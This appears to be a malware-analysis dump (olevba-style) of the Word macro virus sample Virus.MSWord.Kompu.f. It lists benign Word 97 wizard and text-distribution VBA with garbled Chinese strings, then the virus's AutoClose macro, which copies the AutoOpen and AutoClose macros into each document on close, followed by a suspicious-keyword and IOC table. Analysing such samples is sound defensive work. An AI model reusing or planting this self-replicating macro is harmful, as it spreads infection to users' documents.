    StrFetchPref = System.PrivateProfileString("", strRegSettingsKey, strId)
    Exit Function
LReturnNull:
    StrFetchPref = ""
End Function

'returns the string stored in strId. If empty, returns strDefault
Public Function StrRestorePref(strId As String, strDefault As String) As String
    Dim strTemp As String

    strTemp = StrFetchPref(strId)
    ' If length is 0, it wasn't in regsistry, so use default value
    If Len(strTemp) = 0 Then
        strTemp = strDefault
    ' "~" is a placeholder to allow returning empty strings
    ElseIf strTemp = "~" Then
        strTemp = ""
    End If
    
    StrRestorePref = strTemp
End Function

' --------------------------------------------------------------------------------------
' WORD 97 MINI-WIZARD
' Envelope Wizard Specific Code
' --------------------------------------------------------------------------------------

Option Explicit

' --------------------------------------------------------------------------------------
' DECLARATIONS
' --------------------------------------------------------------------------------------

Public Const strWIZ_NAME = "«H«ÊºëÆF"
Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)
Public Const strBALLOON_HEADING = "Åwªï¨Ï¥Î«H«ÊºëÆF¡C"
Public Const strOPTION_ONE_ACCELERATOR = "C"   'This is the form accelerator for strInitialBalloon(0)
Public Const strOPTION_TWO_ACCELERATOR = "e"   'This is the form accelerator for strInitialBalloon(1)
Public strInitialBalloon(iBALLOON_OPTIONS) As String
Public strHelpTip(iBALLOON_OPTIONS) As String

Public Sub InitWizardStrings()
  
' NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes
    ' Balloon / Form menu options
    strInitialBalloon(0) = "«Ø¥ß¤@«H«Ê"
    strInitialBalloon(1) = "«Ø¥ß¶l±H²M³æ¤¤ªº©Ò¦³«H«Ê"

    ' Assistant help messages
strHelpTip(0) = "½ÐÁä¤J«H«Ê¤W±H¥ó¤H¤Î¦¬¥ó¤Hªº¦a§}¡C©ÎªÌ¬O±q Microsoft Outlook ³sµ¸¤H©Î Microsoft Exchange ­Ó¤H³q°T¿ý¤¤«ö¤@¤U¡u³q°T¿ý¡v«ö¶s¨Ï¥Î¨ä¤¤ªº¦W³æ¡C·í±zÁä¤J¦a§}¤§«á½Ð«ö¡u¦C¦L¡v¡C"
strHelpTip(1) = "±z¥i¥H¨Ï¥Î¦X¨Ö¦C¦Lªº¥\¯à¨Ó«Ø¥ß«H«Ê¡C°²¦p±z»Ý­nÀ°¦£¡A¨º»ò¦b¦X¨Ö¦C¦L¹ï¸Ü¤è¶ô³»ºÝªº»¡©ú±N·|¤Þ¾É±z§¹¦¨Á`¦@¦³¤T¨BÆJªºµ{§Ç¡C"

End Sub  ' InitWizardStrings

Public Function fnInitialBalloon(iBtn)
    
    'On Error GoTo ErrorInitBalloon
    
    Select Case iBtn
        Case Is < 1 'Exit
            ActiveDocument.Close wdDoNotSaveChanges
        Case 1 ' Open the envelope dialog
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogToolsCreateEnvelope).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
        Case 2 ' Start a Mail Merge to envelopes
            ActiveDocument.MailMerge.MainDocumentType = wdEnvelopes
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogMailMergeHelper).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
    End Select
    Exit Function
    
End Function ' fnInitialBalloon

' End Envelope Wizard Module
Private Const SZ_MACRONAME = "¤å¦r§¡µ¥¤À"
Global iPrevChars As Integer

Sub Insert()
    Dim n As Integer
    Dim para As Paragraph
    Dim fld As Field
    
    On Error GoTo LError
    
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    n = 2
    With Selection
        If ((Selection.Start = Selection.End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        
        For Each fld In .Fields
            a$ = fld.Code
            If (FIsDistField(a$)) Then
                iTop = InStr(1, a$, ",")
                iEnd = InStr(1, a$, ")") - 1
                n = iEnd - iTop
                dlgDist.ID_RESET.Enabled = True
                GoTo LSkip
            ElseIf (InStr(1, a$, "eq") <> 0) Then
                MsgBox "¦¹¦r¦ê¥¼§¡µ¥¤À", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        Next fld
        dlgDist.ID_RESET.Enabled = False
        If (Len(Selection.Text) < 2) Then
            MsgBox "½Ð¿ï¨ú­n§¡µ¥¤Àªº¦r¦ê¡A¥B¦r¦ê­n¦³¨â­Ó¦r¥H¤W¡C", Title:=SZ_MACRONAME
            GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(13)) Then
                MsgBox "´«¦æ²Å¸¹¡B©w¦ìÂI¤Î¥\¯àÅÜ¼Æ³£¤£ºâ¬O¤@­Ó¦r¡A½Ð­«·s¿ï¾Ü­n§¡µ¥¤Àªº¦r¦ê¡C", Title:=SZ_MACRONAME
                GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(9)) Then
                MsgBox "´«¦æ²Å¸¹¡B©w¦ìÂI¤Î¥\¯àÅÜ¼Æ³£¤£ºâ¬O¤@­Ó¦r¡A½Ð­«·s¿ï¾Ü­n§¡µ¥¤Àªº¦r¦ê¡C", Title:=SZ_MACRONAME
                GoTo LExit
        End If
        If (InStr(1, Selection.Text, Chr$(13)) <> 0) Then
            For Each para In .Paragraphs
                If (n < (Len(para.Range.Text) - 1)) Then
                    n = Len(para.Range.Text) - 1
                End If
            Next para
        Else
            n = Len(Selection.Text)
        End If
        If (n < iPrevChars) Then
            n = iPrevChars
        End If
    End With

LSkip:
    If (n > 32) Then
        n = 32
    ElseIf (n < 1) Then
        n = 1
    End If
    dlgDist.IDCS_SIZE.Value = n
    dlgDist.IDCE_SIZE.Text = n
    dlgDist.IDCE_SIZE.IMEMode = fmIMEModeNoControl
    dlgDist.IDCE_SIZE.SetFocus
    dlgDist.IDCE_SIZE.SelStart = 0
    dlgDist.IDCE_SIZE.SelLength = 99
    
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    
    dlgDist.Show

LExit:
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Create(n As Integer)
    Dim rgn As Range
    Dim rgnTmp As Range
    Dim rgnOrg As Range
    Dim para As Paragraph
    Dim cmdb As CommandBar
    
    On Error GoTo LError
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    With Selection
        Set rgnOrg = .Range
        For Each para In rgnOrg.Paragraphs
            If (InStr(1, rgnOrg.Text, Chr$(13)) <> 0) Then
                Set rgn = para.Range
                If (para.Range.Start < rgnOrg.Start) Then
                    rgn.SetRange rgnOrg.Start, rgn.End - 1
                ElseIf (para.Range.End > rgnOrg.End) Then
                    rgn.SetRange rgn.Start, rgnOrg.End - 1
                Else
                    rgn.SetRange rgn.Start, rgn.End - 1
                End If
                rgn.Select
            Else
                Set rgn = rgnOrg
            End If
            cLineBreak = InStr(1, rgn.Text, Chr$(11))
            If (cLineBreak <> 0) Then
                rgn.SetRange rgn.Start, rgn.Start + cLineBreak - 1
                rgn.Select
            End If
            If (.Fields.Count > 0) Then
                a$ = .Fields(1).Code
                If (FIsDistField(a$) = True) Then
                    Resize .Fields(1), n
                    GoTo LContinue
                End If
            End If
            
            c = Len(.Text)
            ' Remove Additional Spaces
            sz$ = .Text
            x = 0
            While (FIsSpace(Right$(sz$, 1)) <> 0)
                sz$ = Left$(sz$, Len(sz$) - 1)
                x = x + 1
            Wend
            
            ' Create DistChar field
            ' {eq \o\ad(foo,     )}
            Set rgn = .Range
            If (x > 0) Then
                .MoveRight
                .MoveLeft unit:=wdCharacter, Count:=x
                .Delete unit:=wdCharacter, Count:=x
                rgn.Select
            End If
            .InsertAfter "," + String$(n, "¡@") + ")"
            .InsertBefore "eq \o\ad("
            rgn.SetRange rgn.Start + Len("eq \o\ad("), rgn.End
            rgn.Font.DisableCharacterSpaceGrid = False
            Set rgn = .Range
           ' Insert Field
            .Fields.Add .Range, , , False
            ' { eq \o\ad(foo,     ) }
            '                      ~ Remove tip space
            rgn.Select
            rgn.SetRange .Range.End - 2, .Range.End - 1
            rgn.Text = ""
            
            .Fields.ToggleShowCodes
            .MoveRight , 1, 1
LContinue:
        Next para
    End With
    rgnOrg.Select
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

' *************************************
Function FIsSpace(wh$)
    ch = AscW(wh$)
    ' Space DBSpace EmSpace EnSpace 1/4EmSpace
    If ch = 32 Or ch = 12288 Or ch = 8197 Or ch = 8194 Or ch = 8195 Then
        FIsSpace = ch
    Else
        FIsSpace = 0
    End If
End Function


Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim fld As Field
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        
        If (.Fields.Count < 1) Then
'            Create (Len(.Text) + 1)
            Beep
            GoTo LExit:
        End If
        For Each fld In rgn.Fields
            a$ = fld.Code
            Set rgnFld = fld.Code
            If (FIsDistField(rgnFld.Text) = False) Then
                GoTo LContinue:
            End If
            rgnFld.Select
            
            iTop = InStr(1, a$, "(") + rgnFld.Start
            iEnd = rgnFld.End - (Len(rgnFld.Text) - InStr(1, a$, ",¡@") + 1)
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            rgnNew.Font.DisableCharacterSpaceGrid = True
            rgnNew.Select
            .MoveRight
            .MoveRight , 1, 1
            .Delete
LContinue:
        Next fld
        rgn.Select
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Sub Resize(fld As Field, iNew As Integer)
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    On Error GoTo LError
    With Selection
        Dim rgn As Range
        a$ = fld.Code
        Set rgn = fld.Code
        
        iTop = rgn.End - (Len(a$) - InStr(1, a$, ",¡@"))
        iEnd = rgn.End - (Len(a$) - InStr(1, a$, ")") + 1)
        rgn.SetRange iTop, iEnd
        rgn.Text = String$(iNew, "¡@")
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Function FIsDistField(szFld As String) As Boolean
    FIsDistField = False
    ' { eq \o\ad(foo,¡@¡@¡@)}
    '   ~~~~~~~~~        ~~~
    If (Left$(szFld, 10) = " eq \o\ad(") And (Right$(szFld, 2) = "¡@)") Then
        FIsDistField = True
    End If
End Function




-------------------------------------------------------------------------------
VBA MACRO U13.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/U13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim fileenimi$
'AutoClose
'Makroviirus Kompu
On Error Resume Next
fileenimi$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:AutoOpen", fileenimi$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoClose", fileenimi$ + ":AutoClose"
WordBasic.FileSaveAs Name:=fileenimi$, Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?                   |                                             |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?PRD=Word&SBP=ia&PVE|                                             |
|          |R=8.0&AR=templates  |                                             |
|IOC       |redir.dll           |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

